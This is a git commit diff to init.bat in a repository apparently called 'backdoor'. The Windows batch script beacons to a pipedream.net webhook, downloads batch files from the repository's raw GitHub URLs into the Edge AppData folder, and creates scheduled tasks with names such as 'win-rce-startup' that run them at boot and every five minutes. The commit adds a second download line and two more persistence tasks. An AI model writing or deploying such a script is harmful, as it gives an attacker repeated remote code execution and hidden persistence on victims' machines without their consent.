9dac44541b28f95e75892e621e0c8637788c2b98
Wolfoverflow <57900648+Wolfoverflow@users.noreply.github.com>
2023-11-10 13:31:16 +1100

    Update init.bat

--- init.bat
+++ init.bat
@@ -1,5 +1,8 @@
 cd C:\Users\%username%\Appdata\Local\Microsoft\Edge
 curl -d "{'event':'initalization'}" https://eojlk5hggkgar9y.m.pipedream.net
-curl -O recur.bat "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/recur.bat" 
+curl -o recur.bat "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/recur.bat"
+curl -o recur.bat "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/init.bat"
 schtasks /CREATE /TN "win-rce-startup" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\recur.bat" /SC ONSTART
 schtasks /CREATE /TN "win-rce-interval" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\recur.bat" /SC MINUTE /MO 5
+schtasks /CREATE /TN "win-rce-installer-startup" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\init.bat" /SC ONSTART
+schtasks /CREATE /TN "win-rce-installer-interval" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\init.bat" /SC MINUTE /MO 5
